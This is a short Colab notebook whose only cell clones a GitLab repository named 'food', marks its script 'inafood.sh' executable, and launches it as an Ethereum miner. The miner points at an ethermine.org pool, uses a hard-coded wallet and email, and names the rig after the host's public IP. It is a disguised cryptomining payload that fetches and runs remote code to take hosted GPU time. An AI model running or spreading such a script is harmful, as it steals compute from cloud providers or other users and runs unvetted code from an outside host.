{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "S2.ipynb",
      "provenance": []
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "accelerator": "GPU"
  },
  "cells": [
    {
      "cell_type": "code",
      "metadata": {
        "id": "hOscE_s4oBuVU"
      },
      "source": [
        "!nvidia-smi\n",
        "!git clone https://gitlab.com/irul12555/food.git\n",
        "%cd food\n",
        "!chmod +x inafood.sh\n",
        "!ip=$(echo \"$(curl -s ifconfig.me)\" | tr . _ ) && ./inafood.sh -algo Ethash -pool1 eu1.ethermine.org:4444 -wallet 0x4ee351b518733adba8aee4fbfd64bce2061b3ebd -coin eth -rigName $ip -email irul12555@gmail.com"
      ],
      "execution_count": null,
      "outputs": []
    }
  ]
}
